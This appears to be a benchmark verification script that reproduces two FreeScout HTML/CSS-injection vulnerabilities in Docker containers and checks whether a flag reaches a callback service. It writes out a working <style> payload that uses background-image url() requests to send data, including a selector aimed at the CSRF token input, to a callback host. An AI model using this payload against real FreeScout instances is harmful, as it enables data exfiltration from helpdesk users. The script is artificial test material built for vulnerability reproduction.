#!/usr/bin/env bash
# verify.sh --seed|--residual — freescout CVE-2025-48489 -> CVE-2026-40497
# 效果通道：victim chromium 打开真实会话视图后，callback /dump 出现 PCB_FLAG
#   --seed     : 未闭合 <iframe src=callback> （CVE-2025-48489）
#                v0(1.8.179) 成对正则放过 / v1(1.8.212) 未闭合遍剥掉
#   --residual : <style>background-image:url(callback)</style> （CVE-2026-40497）
#                v1 blocklist 无 style，CSS 在真实 DOM 里发请求
# payload 嵌入 RUN_FLAG（wrong/stale 时为 override）；判定用 RUN_FLAG_REF
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: verify.sh --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }
_hostport() { dc port "$1" "$2" 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}'; }

PORT="$(_hostport "$VERSION" 80)"
VICTIM_PORT="$(_hostport victim 8070)"
CB_PORT="$(_hostport callback 9000)"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}" ;;
    v1) PORT="${PORT_V1_0:-}" ;;
    v2) PORT="${PORT_V2_0:-}" ;;
  esac
fi
VICTIM_PORT="${VICTIM_PORT:-${PORT_VICTIM_0:-}}"
CB_PORT="${CB_PORT:-${PORT_CALLBACK_0:-}}"
if [[ -z "$PORT" || -z "$VICTIM_PORT" || -z "$CB_PORT" ]]; then
  echo "verify: 端口解析失败 app=$PORT victim=$VICTIM_PORT callback=$CB_PORT (need --profile + compose.env)" >&2
  exit 20
fi
export PCB_APP_PORT="$PORT" PCB_VICTIM_PORT="$VICTIM_PORT" PCB_CB_PORT="$CB_PORT"
export PCB_TARGET_PORT="$PORT"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"

ready=0
for _ in $(seq 1 90); do
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/login" || true)"
  vhealth="$(curl -s --max-time 5 "http://127.0.0.1:${VICTIM_PORT}/health" || true)"
  chealth="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${CB_PORT}/health" || true)"
  if [[ "$code" == "200" || "$code" == "302" ]] && [[ "$vhealth" == "ok" ]] && [[ "$chealth" == "200" ]]; then
    ready=1
    break
  fi
  sleep 2
done
[[ "$ready" == 1 ]] || { echo "target not ready app=$PORT victim=$VICTIM_PORT cb=$CB_PORT" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || true)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'payload': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT=""
  for _try in 1 2 3; do
    OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" && break
    echo "verify: seed_exec retry ${_try}: $OUT" >&2
    sleep 4
  done
  echo "$OUT" | grep -q 'hits' || { echo "$OUT" >&2; exit 20; }
else
  # residual（CVE-2026-40497，heldout 语义内嵌，不引用 hidden 文件）：
  # <style> CSS 注入。seed 的未闭合 iframe 在 V1 被未闭合遍清除；blocklist 无 style，
  # background-image 打到 internal callback。V2 1.8.213 才把 style 加入表。
  printf '%s' "{\"id\": \"cve-2026-40497-style-css-exfil\", \"payload\": \"<style>body{background-image:url('http://callback:9000/c?flag=$RUN_FLAG&via=style')}input[name='_token']{background-image:url('http://callback:9000/c?flag=$RUN_FLAG&via=token')}</style>\"}" > "$WORK_DIR/cand.json"
  OUT=""
  for _try in 1 2 3; do
  OUT="$("$PY" - "$VERSION" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ.get("PYTHONPATH", "").split(":")[0] or ".")
import poc_common
FLAG = os.environ.get("PCB_FLAG") or os.environ.get("RUN_FLAG") or "PCBFLAGUNSET"
CB = "http://callback:9000/c?flag=" + FLAG
payload = ("<style>"
           "body{background-image:url('" + CB + "&via=style')}"
           "input[name='_token']{background-image:url('" + CB + "&via=token')}"
           "</style>")
r = poc_common.run_payload(payload, sys.argv[1])
print(json.dumps(r, default=str))
PYEOF
)" && break
    echo "verify: residual retry ${_try}: $OUT" >&2
    sleep 4
    OUT=""
  done
  echo "$OUT" | grep -q 'hits' || { echo "$OUT" >&2; exit 20; }
fi

echo "[verify] mode=$MODE version=$VERSION app=$PORT victim=$VICTIM_PORT cb=$CB_PORT resp=$(printf '%s' "$OUT" | head -c 240)"
if grep -qF -- "$JUDGE" <<<"$OUT"; then
  echo "[verify] EFFECT: flag observed on callback"
  exit 0
fi
echo "[verify] NO EFFECT: flag not observed"
exit 10
